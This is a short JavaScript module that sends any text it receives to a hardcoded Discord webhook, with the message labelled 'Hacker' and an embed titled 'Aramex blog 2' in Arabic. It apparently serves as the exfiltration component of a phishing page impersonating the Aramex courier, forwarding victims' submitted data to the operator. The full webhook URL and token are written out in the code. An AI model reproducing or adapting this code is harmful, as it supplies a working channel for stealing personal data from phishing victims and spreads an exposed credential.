import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323965355307175947/MTAqPM4pjuM5IrOSpjR32eBRyg6U9W9T3STJ_6x_AAAbLDMOfjYIZr10uAoHLNlnzg69",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
